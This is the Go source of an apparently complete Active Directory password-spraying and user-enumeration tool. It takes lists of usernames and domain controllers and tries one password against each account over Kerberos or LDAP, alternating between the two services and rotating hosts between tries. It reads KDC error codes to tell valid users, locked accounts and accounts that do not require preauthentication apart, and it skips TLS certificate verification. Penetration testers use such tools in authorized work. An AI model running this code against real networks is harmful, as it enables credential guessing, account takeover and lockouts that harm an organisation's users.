package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
	"gopkg.in/jcmturner/gokrb5.v7/client"
	"gopkg.in/jcmturner/gokrb5.v7/config"
	"gopkg.in/jcmturner/gokrb5.v7/iana/etypeID"
	"gopkg.in/ldap.v2"
)

var (
	debugging   bool
	debugWriter io.Writer
)

type Authenticator interface {
	Login() (string, string, error)
}

type User struct {
	Name     string
	Password string
	Domain   string
}

type LDAP struct {
	Host string
	User
}

type KERB struct {
	Host string
	User
	Enum bool
}

//FlagOptions set at startup
type FlagOptions struct {
	host     string
	hostfile string
	OutPut   string
	user     string
	userfile string
	domain   string
	pass     string
	outFile  string
	sleep    float64
	enum     bool
	kerb     bool
	ldap     bool
}

func printDebug(format string, v ...interface{}) {
	if debugging {
		output := fmt.Sprintf("[DEBUG] ")
		output += format
		fmt.Fprintf(debugWriter, output, v...)
	}
}

func options() *FlagOptions {
	host := flag.String("H", "", "Domain controller to connect to")
	hostfile := flag.String("Hostfile", "", "File containing the list of domain controllers to connect to")
	domain := flag.String("D", "", "Fully qualified domain to use")
	user := flag.String("U", "", "Username to authenticate as")
	userfile := flag.String("Userfile", "", "File containing the list of usernames")
	pass := flag.String("P", "", "Password to use")
	outFile := flag.String("O", "", "File to append the results to")
	sleep := flag.Float64("sleep", .5, "Time inbetween attempts")
	debug := flag.Bool("debug", false, "Print debug statements")
	enum := flag.Bool("E", false, "Enumerates which users are valid")
	kerb := flag.Bool("K", false, "Test against Kerberos only")
	ldap := flag.Bool("L", false, "Test against LDAP only")
	flag.Parse()
	debugging = *debug
	debugWriter = os.Stdout
	return &FlagOptions{host: *host, domain: *domain, user: *user, userfile: *userfile, hostfile: *hostfile, pass: *pass, outFile: *outFile, sleep: *sleep, enum: *enum, ldap: *ldap, kerb: *kerb}
}

func readfile(inputFile string) []string {
	output, err := ioutil.ReadFile(inputFile)
	if err != nil {
		log.Fatal(err)
	}
	return strings.Split(string(output), "\n")
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func writefile(outFile, result string) {
	cf, err := os.OpenFile(outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer cf.Close()
	_, err = cf.Write([]byte(result))
	check(err)
}

func main() {
	opt := options()
	var hosts []string
	var password string
	var usernames []string
	var services []string
	services = []string{"KERB", "LDAP"}
	fmt.Println(`
  __________  ________  ___       ________  ________
  |\___    _\\\   __  \|\  \     |\   __  \|\   ___  \
  \|___ \  \_\ \  \|\  \ \  \    \ \  \|\  \ \  \\ \  \
       \ \  \ \ \   __  \ \  \    \ \  \\\  \ \  \\ \  \
        \ \  \ \ \  \ \  \ \  \____\ \  \\\  \ \  \\ \  \
         \ \__\ \ \__\ \__\ \_______\ \_______\ \__\\ \__\
          \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
					          (@Tyl0us)

								`)

	if opt.enum {
		services = []string{"KERB"}
		password = string(" ")
	}

	if opt.kerb {
		services = []string{"KERB"}
	}

	if opt.ldap {
		services = []string{"LDAP"}
	}

	if opt.kerb && opt.ldap {
		log.Fatal("Error: Please choose one or the other")
	}

	if opt.enum && opt.ldap {
		log.Fatal("Error: Can't use LDAP only option with Enumeration option")
	}
	if opt.enum && opt.kerb {
		log.Fatal("Error: Can't use Kerberos only option with Enumeration option")
	}

	if opt.host == "" && opt.hostfile == "" {
		log.Fatal("Error: Please provide a host or list of hosts")
	}
	if opt.host != "" {
		printDebug("Appending %s\n", opt.host)
		hosts = append(hosts, opt.host)
	}
	if opt.hostfile != "" {
		printDebug("Reading host file %s\n", opt.hostfile)
		fileHosts := readfile(opt.hostfile)
		printDebug("Appending hosts %v\n", fileHosts)
		for _, host := range fileHosts {
			hosts = append(hosts, host)
		}
	}

	if opt.user == "" && opt.userfile == "" {
		log.Fatal("Error: Please provide an username or list of usernames")
	}

	if opt.pass == "" && opt.enum == false {
		log.Fatal("Error: Please provide a password or select the enumeration option")
	}

	if opt.pass != "" {
		printDebug("Appending password %s\n", opt.pass)
		password = opt.pass
	}

	if opt.userfile != "" {
		printDebug("Reading user file %s\n", opt.userfile)
		fileUsers := readfile(opt.userfile)
		printDebug("Appending users %v\n", fileUsers)
		for _, user := range fileUsers {
			if user != "" {
				usernames = append(usernames, user)
			}
		}
	}

	if opt.user != "" {
		printDebug("Appending user %s\n", opt.user)
		usernames = append(usernames, opt.user)
	}

	sleep := opt.sleep
	domain := strings.ToUpper(opt.domain)
	printDebug("Domain %v\tUsernames %v\tPasswords %v\tHosts %v\tServices %v\n", domain, usernames, password, hosts, services)
	x := 0
	rand.Seed(time.Now().Unix())
	lenServices := len(services) - 1
	for _, username := range usernames {
		n := 0
		if opt.hostfile != "" {
			n = rand.Int() % (len(hosts) - 1)
		}
		if hosts[n] == "" {
			return
		}
		time.Sleep(time.Duration(sleep) * time.Second)
		auth := setup(services[x], hosts[n], domain, username, password, opt.enum)
		result, forfile, _ := auth.Login()
		fmt.Println(result)
		if strings.Contains(result, "User's Account Locked") && opt.enum != true {
			reader := bufio.NewReader(os.Stdin)
			fmt.Print("[*] Account lock out detected - Do you want to continue.[y/n]: ")
			text, _ := reader.ReadString('\n')
			if strings.Contains(text, "y") {
				continue
			}
			log.Fatal("Shutting down")
		}
		if opt.outFile != "" {
			forfile = forfile + "\n"
			writefile(opt.outFile, forfile)
		}
		if lenServices == x {
			x = 0
		} else {
			x++
		}
	}

}

func setup(service, host, domain, username, password string, enum bool) Authenticator {
	switch service {
	case "KERB":
		return KERB{Host: host, User: User{Name: username, Password: password, Domain: domain}, Enum: enum}
	case "LDAP":
		return LDAP{Host: host, User: User{Name: username, Password: password, Domain: domain}}
	}
	return nil
}

func (l LDAP) Login() (string, string, error) {
	printDebug("Logging into LDAP with %v", l)
	conn, err := ldap.DialTLS("tcp", (l.Host + ":636"), &tls.Config{InsecureSkipVerify: true})

	if err != nil {
		fmt.Println(err)
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("[*] Do you want to continue.[y/n]: ")
		text, _ := reader.ReadString('\n')
		if strings.Contains(text, "y") {
			return "", "", nil //err
		}
		log.Fatal("[*] Shutting down")
	}

	conn.StartTLS(&tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return "", "", nil
	}

	defer conn.Close()
	if err := conn.Bind(l.User.Name+"@"+l.User.Domain, l.User.Password); err != nil {
		printDebug(err.Error() + "\n")
		if strings.Contains(err.Error(), "comment: AcceptSecurityContext error, data 775, v3839") {
			result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, color.RedString("User's Account Locked"))
			forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, ("User's Account Locked"))
			return result, forfile, err
		} else {
			result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, color.RedString("Failed"))
			forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, ("Failed"))
			return result, forfile, err
		}
	}
	result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, color.GreenString("Success"))
	forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), l.Host, l.User.Domain, l.User.Name, l.User.Password, ("Success"))
	return result, forfile, err
}
func (k KERB) Login() (string, string, error) {
	printDebug("Logging into Kerberos with %v", k)
	cfg, err := config.NewConfigFromString("[libdefaults]\n         default_realm = ${REALM}\n      dns_lookup_realm = false\n         dns_lookup_kdc = true\n         [realms]\n          " + k.User.Domain + " = {\n          kdc =" + k.Host + ":88\n          }\n")
	if k.Enum == true {
		cfg.LibDefaults.PreferredPreauthTypes = []int{int(etypeID.DES3_CBC_SHA1_KD)}
	}
	if err != nil {
		panic(err.Error())
	}
	cl := client.NewClientWithPassword(k.User.Name, k.User.Domain, k.User.Password, cfg, client.DisablePAFXFAST(true), client.AssumePreAuthentication(true))
	err = cl.Login()
	if err != nil {
		printDebug(err.Error() + "\n")
		if strings.Contains(err.Error(), "AS_REQ to KDC: failed to communicate with KDC") {
			fmt.Println("[Root cause: Networking_Error] Networking_Error: AS Exchange Error: failed sending AS_REQ to KDC: failed to communicate with KDC " + k.Host)
			reader := bufio.NewReader(os.Stdin)
			fmt.Print("[*] Do you want to continue.[y/n]: ")
			text, _ := reader.ReadString('\n')
			if strings.Contains(text, "y") {
				return "", "", nil //err
			}
			log.Fatal("[*] Shutting down")
		}
		if k.Enum == true {
			if strings.Contains(err.Error(), "(37) KRB_AP_ERR_SKEW Clock skew") {
				fmt.Println(color.RedString("[-] ") + "The difference between the time on the Kerberos and you is too great to continue")
				log.Fatal("[*] Shutting down")
			}
			if strings.Contains(err.Error(), "KDC_ERR_CLIENT_REVOKED") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.RedString("User's Account Locked"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User's Account Locked"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.RedString("User Does Not Exist"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Does Not Exist"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "KDC_ERR_PREAUTH_FAILED") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("User Exist"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Exist"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "AS Exchange Error: AS_REP is not valid or client password/keytab incorrect < Decrypting_Error: error decrypting EncPart of AS_REP < Decrypting_Error: error decrypting AS_REP encrypted part: error decrypting: integrity verification failed") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("User Exist - But Does Not Require Preauth"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Exist - But Does Not Require Preauth"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "AS Exchange Error: kerberos error response from KDC: KRB Error: (12) KDC_ERR_POLICY KDC policy rejects request") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("User Exist - But Smartcard is Required"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Exist - But Smartcard is Required"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "AS Exchange Error: kerberos error response from KDC: KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("User Exist"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Exist"))
				return result, forfile, err
			}
			if strings.Contains(err.Error(), "KRBMessage_Handling_Error: AS Exchange Error: AS_REP is not valid or client password/keytab incorrect < Decrypting_Error: error decrypting EncPart of AS_REP < Decrypting_Error: error decrypting AS_REP encrypted part: error decrypting: integrity checksum incorrect") {
				result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("User Exist - But Only Allows Kerberos DES Encrpytion and Does Not Require Preauth"))
				forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User Exist - But Only Allows Kerberos DES Encrpytion and Does Not Require Preauth"))
				return result, forfile, err
			}
		}
		if strings.Contains(err.Error(), "(37) KRB_AP_ERR_SKEW") {
			fmt.Println(color.RedString("[-] ") + "The difference between the time on the Kerberos and you is too great to continue")
			log.Fatal("[*] Shutting down")
		} else if strings.Contains(err.Error(), "KDC_ERR_CLIENT_REVOKED") {
			result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.RedString("User's Account Locked"))
			forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("User's Account Locked"))
			return result, forfile, err
		} else {
			result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.RedString("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.RedString("Failed"))
			forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[-] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("Failed"))
			return result, forfile, err
		}
	}
	result := fmt.Sprintf("%s %s %s\\%s:%s = %s", color.GreenString("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, color.GreenString("Success"))
	forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("Success"))
	return result, forfile, nil
}
